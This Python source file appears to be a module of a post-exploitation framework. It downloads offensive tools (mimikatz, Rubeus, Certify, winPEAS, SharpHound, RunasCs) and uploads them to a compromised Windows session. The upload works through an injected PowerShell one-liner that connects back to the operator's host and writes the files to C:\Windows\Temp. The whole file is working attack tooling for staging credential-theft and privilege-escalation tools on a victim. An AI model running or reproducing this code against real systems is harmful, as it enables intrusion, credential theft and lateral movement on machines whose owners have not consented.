from __future__ import annotations

import select
import tempfile
import time
import urllib.request
import zipfile

from koi.modules.blueprint import KoiModule
from koi.utils.tcp import get_local_ip, spawn_send_server

MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

TOOLS: dict[str, str] = {
    "Rubeus.exe":      "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Rubeus.exe",
    "RunasCs.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/RunasCs.exe",
    "Certify.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Certify.exe",
    "winPEAS.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/winPEAS.exe",
    "SharpHound.ps1":  "https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1",
}


class PopulateWinModule(KoiModule):
    name        = "populate_win"
    description = "Upload common exploitation tools (Rubeus, RunasCs, Certify, winPEAS, SharpHound, mimikatz) on the target."
    usage       = "populate_win <id> [-o <remote_dir>]"
    category    = "Other"
    platform    = "windows_ps"
    arguments   = [
        {
            "flags":   ["-o", "--output-dir"],
            "default": "C:\\Windows\\Temp",
            "help":    "Remote directory where tools will be saved",
        },
    ]

    def _fetch_url(self, url: str) -> bytes:
        """Download *url* locally and return its raw bytes."""
        with urllib.request.urlopen(url, timeout=30) as resp:
            return resp.read()

    def _fetch_mimikatz_exe(self) -> bytes:
        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
        import os
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            urllib.request.urlretrieve(MIMIKATZ_ZIP_URL, tmp_path)
            with zipfile.ZipFile(tmp_path) as zf:
                return zf.read("x64/mimikatz.exe")
        finally:
            os.unlink(tmp_path)

    def _upload_exe(self, raw: bytes, dest: str) -> bool:
        """Upload raw bytes to *dest* on the target via a side TCP connection."""
        local_ip = get_local_ip(self.session.addr[0])
        port, thread, errors = spawn_send_server(raw, timeout=30)

        ps_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite('{dest}');"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )

        if self.session.upgraded:
            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(4096)
        elif self.session.os_type == "windows_ps":
            self.sendline(ps_cmd)
        else:
            escaped = ps_cmd.replace('"', '\\"')
            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

        thread.join(timeout=30)

        if errors:
            return False

        time.sleep(1.0)
        check = self._win_query(f"(Test-Path '{dest}').ToString()")
        return check.strip().lower() == "true"

    def run(self) -> None:
        out_dir = (self.args.output_dir or "C:\\Windows\\Temp").rstrip("\\")

        self.status(f"Populating {out_dir} with exploitation tools…")
        print()

        results: dict[str, str] = {}

        for name, url in TOOLS.items():
            dest = f"{out_dir}\\{name}"
            with self.spinner(f"Fetching and uploading {name}…"):
                try:
                    raw = self._fetch_url(url)
                    ok  = self._upload_exe(raw, dest)
                except Exception as exc:
                    ok = False
                    results[name] = f"error: {exc}"
                    continue
            results[name] = dest if ok else "FAILED"

        dest = f"{out_dir}\\mimikatz.exe"
        with self.spinner("Downloading mimikatz…"):
            try:
                raw = self._fetch_mimikatz_exe()
                ok  = self._upload_exe(raw, dest)
            except Exception as exc:
                ok = False
                results["mimikatz.exe"] = f"error: {exc}"
        if "mimikatz.exe" not in results:
            results["mimikatz.exe"] = dest if ok else "FAILED"

        from koi.utils.ui import _y, _r, _gr
        display = {}
        for name, val in results.items():
            if val == "FAILED" or val.startswith("error"):
                display[name] = _r(val)
            else:
                display[name] = _y(val)

        print()
        self.box("populate_win results", display)
